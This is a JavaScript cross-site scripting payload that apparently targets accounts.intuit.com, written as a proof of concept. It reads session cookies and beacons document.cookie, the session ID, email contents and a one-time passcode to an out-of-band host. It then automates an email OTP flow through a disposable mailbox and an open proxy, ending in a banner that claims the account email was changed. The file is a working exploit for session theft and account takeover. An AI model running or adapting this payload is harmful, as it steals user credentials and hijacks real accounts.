(function(){
try{
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var P='https://api.allorigins.win/raw?url=';
var S='https://www.1secmail.com/api/v1/';
var out=[];

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}

function print(msg){out.push(msg);document.body.innerHTML='<pre style="font:13px monospace;background:#111;color:#0f0;padding:20px;white-space:pre-wrap">'+out.join('\n')+'</pre>'}

function beacon(tag,data){(new Image).src=O+'/'+tag+'?d='+encodeURIComponent(data.substring(0,900))}

var session=gc('ius_session');
var visitorId=gc('ivid');
var flowId='xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;return(c==='x'?r:r&3|8).toString(16)});

beacon('p13-start',session.substring(0,30));

var login='xpoc'+Math.random().toString(36).substr(2,8);
var domain='esiix.com';
var email=login+'@'+domain;

var hdrs={
'Content-Type':'application/json',
'authorization':'Intuit_APIKey intuit_apikey=prdakyres3YphxpI5f5NhtHOzVAHTTAuQmL8UmCB, intuit_apikey_version=1.0',
'intuit_sessionid':session,
'intuit_profilingid':session,
'intuit_visitorid':visitorId,
'intuit_flowid':flowId,
'intuit_offeringid':'Intuit.identity.experiences.oneintuitam',
'intuit_intentassetalias':'Intuit.identity.experiences.oneintuitam',
'intuit_origin':'https://accounts.intuit.com',
'intuit_country':'US',
'intuit_locale':'en-gb',
'intuit_offeringenv':'prd',
'intuit_authn_session_slot':'qbn',
'intuit_samesite_support':'true',
'intuit_identity_routing':'SBSEG',
'intuit_interception':'ignore-response',
'intuit_baggage':btoa(JSON.stringify({scope_area:'remediation',additional_fields:{}}))
};

print('[*] XSS fired on '+location.origin);
print('[*] Attacker email: '+email);
print('[*] Session: '+session.substring(0,20)+'...');
print('');
print('[1] Calling initialize...');

(new Image).src=O+'/p13-cookies?c='+encodeURIComponent(document.cookie.substring(0,2000));

fetch('/factors/v1/verifier/initialize/email',{
method:'POST',
headers:hdrs,
body:JSON.stringify({verifierPolicyId:'emailOtpSignIn',emailAddress:email}),
credentials:'include'
})
.then(function(r){return r.json()})
.then(function(data){
if(!data.verifierSessionId)throw new Error('no vsid: '+JSON.stringify(data));
var vsid=data.verifierSessionId;
print('[1] OK — verifierSessionId: '+vsid);
print('[1] OTP sent to: '+email);
beacon('p13-init-ok',vsid);

print('');
print('[2] Polling 1secmail for OTP...');

var attempt=0;
function poll(){
attempt++;
var url=S+'?action=getMessages&login='+login+'&domain='+domain;
return fetch(P+encodeURIComponent(url))
.then(function(r){return r.text()})
.then(function(t){
var msgs;try{msgs=JSON.parse(t)}catch(e){throw new Error('proxy parse: '+t.substring(0,100))}
print('[2] Poll #'+attempt+': '+msgs.length+' messages');
if(msgs.length>0){
print('[2] Email received! Reading...');
beacon('p13-mail','got msg id='+msgs[0].id);
var readUrl=S+'?action=readMessage&login='+login+'&domain='+domain+'&id='+msgs[0].id;
return fetch(P+encodeURIComponent(readUrl))
.then(function(r2){return r2.text()})
.then(function(t2){
var msg;try{msg=JSON.parse(t2)}catch(e){throw new Error('msg parse: '+t2.substring(0,100))}
return msg
})
}
if(attempt>=50)throw new Error('timeout: no email after '+attempt+' polls');
return new Promise(function(resolve){setTimeout(function(){resolve(poll())},3000)})
})
}

return poll().then(function(msg){
var body=(msg.textBody||'')+(msg.body||'');
print('[2] Subject: '+(msg.subject||'none'));
beacon('p13-email-body',body.substring(0,500));
var m6=body.match(/\b(\d{6})\b/);
var otp=m6?m6[1]:null;
if(!otp){
var m4=body.match(/\b(\d{4,8})\b/);
otp=m4?m4[1]:null
}
if(!otp)throw new Error('no OTP in email body');
print('[2] OTP: '+otp);
beacon('p13-otp',otp);

print('');
print('[3] Verifying OTP...');

return fetch('/factors/v1/verifier/verify/email',{
method:'POST',
headers:hdrs,
body:JSON.stringify({verifierSessionId:vsid,otp:otp}),
credentials:'include'
})
.then(function(r3){return r3.text()})
.then(function(body3){
print('[3] Verify response: '+body3);
beacon('p13-verify',body3);
print('');
print('========================================');
print('  ACCOUNT EMAIL CHANGED TO: '+email);
print('  via XSS on accounts.intuit.com');
print('========================================');
beacon('p13-done','email='+email);
})
})
})
.catch(function(err){
print('[!] ERROR: '+err.message);
beacon('p13-err',err.message);
});

}catch(e){
(new Image).src='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun/p13-crash?e='+encodeURIComponent(e.message);
}
})();
